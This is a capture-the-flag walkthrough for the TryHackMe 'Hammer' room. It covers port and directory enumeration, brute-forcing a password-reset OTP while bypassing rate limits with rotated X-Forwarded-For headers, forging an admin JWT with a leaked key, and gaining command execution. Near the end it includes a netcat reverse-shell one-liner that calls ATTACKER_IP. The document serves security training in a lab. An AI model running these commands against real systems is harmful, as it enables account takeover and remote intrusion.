# Hammer Walkthrough
<br/>

## Intro
Welcome into the Hammer challenge, here is the link to the [room](https://tryhackme.com/room/hammer) on TryHackMe.
Here we will be practicing with authentication bypass techniques to finally reach RCE and grab the flags.

Whenever you feel ready press "Start Machine" and connect via OpenVPN or use the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
Let's add the domain to the hosts file:
```bash
echo "10.10.8.80   hammmer.thm" | sudo tee -a /etc/hosts
```

Now we can do a port scan of the target:
```bash
nmap -sV Hammer.thm
```

This scan shows only port 22 (SSH) open, guess we have to dig deeper as we are expected to deal with a web-app.
Maybe the app is served on an higher or uncommon port, to avoid waiting hours i decided to divide the scan and not use `-p-` for now:
```bash
nmap -sV -p 1-2000 Hammer.thm
```

After a couple of minutes we can notice another open port: 1337.

Let's now navigate to it: `http://hammer.thm:1337`, here we can see a login page but for now we don't have neither the username nor the password.

We can look around to try to find clues:
- Check the login page source code, here we see a commend from the developer which tells us the website directories naming convention `hmr_DIRECTORY_NAME`.

Knowing this we can do some directory fuzzing:
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u "https//hammer.thm:1337/hmr_FUZZ" -fw 18
```

With this small list we get a match on the following directories:
```
hmr_css
hmr_images
hmr_js
hmr_logs
```

The most interesting one here looks like to be the logs one, let's view it:
```
http://hammer.thm:1337/hmr_logs
```

Reading the logs here we can see an email `tester@hammer.thm`.

I took a quick look also at the other directories and nothing seems useful there for now, let's move on and bypass the authentication.

One function to always check for vulnerabilities is the password reset one, usually presented with the button/text "Forgot Password?".
If we input a test email send and capture the request with a tool like Burp Suite, we can see that there is a countdown function, basically we have a bunch of seconds to insert the code that we should have received via email.

Now we have 1 email but not the access to it's inbox, so another way to handle the situation is with a script that keeps requesting a password reset and submit the same code until it gets a match, this obliviously will work only if the application did not implement any rate limiting.

We can do a quick test with Burp Suite capturing the reset  password request and in the response we can notice the header `Rate-Limit-Pending: 9`, looks like we have to bypass also that.

One way is to include in the request another header called `X-Forwarded-For` and assigning it a value like the localhost or possibly IPs that might do not have that rate limiting, let's try with:
```
X-Forwarded-For: 127.0.0.1
```

Unfortunately also this method alone fails after 9 requests, so my idea is to create a script that rotates that IP value.
We could use Burp Suite Intruder with the Pitchfork attack but in the Community Edition the attack will take ages, at this point we can either use another tool like *ffuf*:

1. Let's create the wordlist containing all OTPs:
```bash
#! /bin/bash

for i in {1000..9999}; 

        do echo $i >> all_otp_combinations.txt;
done
```

2. Go to the reset_password page and submit a request of password change with the email we found;
3. Capture that request or at least read the cookie value as we need it;
4. Run *ffuf* with the cookie value and FUZZ all OTPs, we use the pitchfork mode to send every request with a unique value of the `X-Forwarded-For` header to bypass  the rate limit:
```bash
ffuf -mode pitchfork -w all_otp_combinations.txt:FUZZ -w localhost_mutation.txt:FUZ2Z -u "http://hammer.thm:1337/reset_password.php" -X "POST" -d "recovery_code=FUZZ&s=120" -H "Cookie: PHPSESSID=urha68avkbj8n7qqt9h7lvgich" -H "X-Forwarded-For: FUZ2Z" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid" -s
```

5. Once completed refresh your browser page and you should be able to input a new password for the user
6. Login with the new created password

Or create a Python script that does a similar job, BUT in my tests i have created a bunch of them and none was even close to the speed of ffuf which took only a bunch of seconds and was more stable.

<br/>

### Gaining a Foothold
In the dashboard we can see the first flag and a form where e can insert a command.

We can test is with `ls` and we get list of the files in the current working directory:
```
hammer.thm:1337/
composer.json
config.php
dashboard.php
execute_command.php
hmr_css
hmr_images
hmr_js
hmr_logs
index.php
logout.php
reset_password.php
vendor
```

We can notice that many commands are not allowed.
But when we ran `ls` i have noticed a `.key` file, we cannot read it with `cat` but since it is a file in the same directory as the dashboard we can simply navigate to that 
```
http//hammer.thm:1337/hammer.thm:1337/
```

Now we can download it.

Reading the page-source and then checking the cookies we can see that there is an hard-coded JWT token, let's analyze it:
```bash
jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzQxNzI1NjgyLCJleHAiOjE3NDE3MjkyODIsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.Bo2FjxwPdcB7vpUHQZupi4l0qF0-IdfEX7ZyxrNDzjY 
```

```
Token header values:
[+] typ = "JWT"
[+] alg = "HS256"
[+] kid = "/var/www/mykey.key"

Token payload values:                                                                                        
[+] iss = "http://hammer.thm"
[+] aud = "http://hammer.thm"
[+] iat = 1741725682    ==> TIMESTAMP = 2025-03-11 21:41:22 (UTC)
[+] exp = 1741729282    ==> TIMESTAMP = 2025-03-11 22:41:22 (UTC)
[+] data = JSON object:
    [+] user_id = 1
    [+] email = "tester@hammer.thm"
    [+] role = "user"

Seen timestamps:                                                                                             
[*] iat was seen
[*] exp is later than iat by: 0 days, 1 hours, 0 mins

```

Interesting, so now we have a token which set us role as user, maybe the admin can run all commands and we can use it to get a reverse shell.
Since we found the key, we can confirm that it has been used for the JWT tooken inserting it with the token in a website like https://jwt.io.
This means that we can forge a new token with our role set to admin:

Token header:
```json
  "alg": "HS256",
  "kid": "/var/www/html/188ade1.key"
}
```

Payload:
```json
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1741725682,
  "exp": 1741729282,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "admin"
  }
}
```

Signature:
```json
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload), 
  56058354efb3daa97ebab00fabd7a7d7
)
```

New token:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzQxNzI1NjgyLCJleHAiOjE3NDE3MjkyODIsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.uocuTjST5jajnsNExwYASHTFj0WkpBhsUDUx3WeYnxc
```

Now we have to change the old ones with this new in 2 headers in the Burp Suite request: `Authorization` and `Cookie` like this:
```http
POST /execute_command.php HTTP/1.1
Host: hammer.thm:1337
Content-Length: 20
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzQxNzI1NjgyLCJleHAiOjE3NDE3MjkyODIsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.uocuTjST5jajnsNExwYASHTFj0WkpBhsUDUx3WeYnxc
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Origin: http://hammer.thm:1337
Referer: http://hammer.thm:1337/dashboard.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=t0i3i7vftigajdmh7184pjc39m; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzQxNzI1NjgyLCJleHAiOjE3NDE3MjkyODIsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.uocuTjST5jajnsNExwYASHTFj0WkpBhsUDUx3WeYnxc; persistentSession=no
Connection: keep-alive

{"command":"whoami"}
```
<br>

### Last Flag
Now since we can run any command we can get the last flag changing the command in the request to:
```bash
cat /home/ubuntu/flag.txt
```


Just for fun we can also get a reverse shell:
Set up a listener on your machine:
```bash
nc -lvnp 1234
```

Put this command in the Burp Suite request
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 1234 >/tmp/f
```

And now we have a shell as the user `www-data`.

Here we are not required to gain root privileges, i leave to your curiosity trying to move laterally to the Ubuntu user and maybe escalate your privileges.

<br/>
<br/>

Congratulations you have successfully put into practice the authentication bypass techniques you have learned and achieved RCE on the target.

I hope you had a good completing the challenge and following along.

Catch you in the next CTF 😃
